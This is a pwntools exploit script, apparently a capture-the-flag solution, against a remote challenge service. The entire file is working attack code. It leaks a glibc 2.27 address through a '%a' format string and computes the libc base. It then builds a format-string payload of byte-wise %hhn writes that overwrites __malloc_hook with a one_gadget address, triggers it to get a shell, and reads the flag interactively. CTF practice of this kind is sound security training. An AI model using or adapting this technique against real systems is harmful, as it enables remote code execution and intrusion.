from pwn import *

###Util
def printf_chk(fmt):
    r.sendlineafter('choice: \n','1')
    r.sendafter('fmt: \n',fmt)
    return r.recvline()[:-1]

def printf(fmt):
    sleep(1)
    r.sendline('2')
    sleep(1)
    r.send(fmt)

###Addr
#  libc2.27
stdin_struct_offset = 0x3eba00
malloc_hook_offset = 0x3ebc30
one_gadget = 0x4f322

###Exploit
r = remote('nc.eonew.cn',10010)

leaks = printf_chk('%a%a\n')
stdin_struct_addr = int(leaks.split(b'p')[1].split(b'0.0')[1].ljust(12,b'0'),16)
libc_base = stdin_struct_addr-stdin_struct_offset
print(hex(libc_base))

target = []
for i in range(6):
    target.append([((libc_base+one_gadget)>>(i*8))&0xff,libc_base+malloc_hook_offset+i])
target = sorted(target)
for i in range(5,0,-1):
    target[i][0]-=target[i-1][0]

payload = ''
for i in range(6):
    if target[i][0]==0:
        payload+=f'%{18+i}$hhn'
    else:
        payload+=f'%{target[i][0]}c%{18+i}$hhn'
payload+='%100000c'
payload = payload.encode().ljust(0x50,b'\x00')
for i in range(6):
    payload+=p64(target[i][1])
printf(payload)

sleep(1)
r.sendline('cat flag 1>&0')
r.interactive()
